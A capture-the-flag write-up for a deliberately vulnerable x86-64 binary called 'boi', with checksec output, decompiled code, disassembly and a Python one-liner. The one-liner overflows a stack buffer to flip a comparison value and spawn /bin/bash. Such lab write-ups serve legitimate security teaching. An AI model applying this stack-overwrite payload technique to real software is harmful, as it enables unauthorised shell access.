# boi

Some basic file enumeration

```s
$ file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
$ pwn checksec --file boi        
[*] 'boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Putting `boi` into Ghidra and looking at the `main` function

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 user_input;
  undefined8 local_30;
  undefined4 local_28;
  int iStack_24;
  undefined4 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  user_input = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack_24 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&user_input,24);
  if (iStack_24 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Where `-0x21524111` is `0xdeadbeef` and `-0x350c4512` is `0xcaf3baee`.

Since there is `run_cmd("/bin/bash")`, you don't need to perform any ret2whatever. All an attacker has to do is overwrite `iStack_24` from `0xdeadbeef` to `0xcaf3baee` to get a shell.

Looking at the disassembly

```
...
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:    mov    edi,0x400764
   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
...
```

`0xdeadbeef` gets loaded into `$rbp-0x1c`. You need to find the offset from where you can write to what you want to overwrite.

The offset happens to be 20 bytes. You can use `exploit.py` to get the shell or you can use a python3 one-liner.

`python3 -c "import sys;sys.stdout.buffer.write(b'A' * 20 + b'\xee\xba\xf3\xca')"`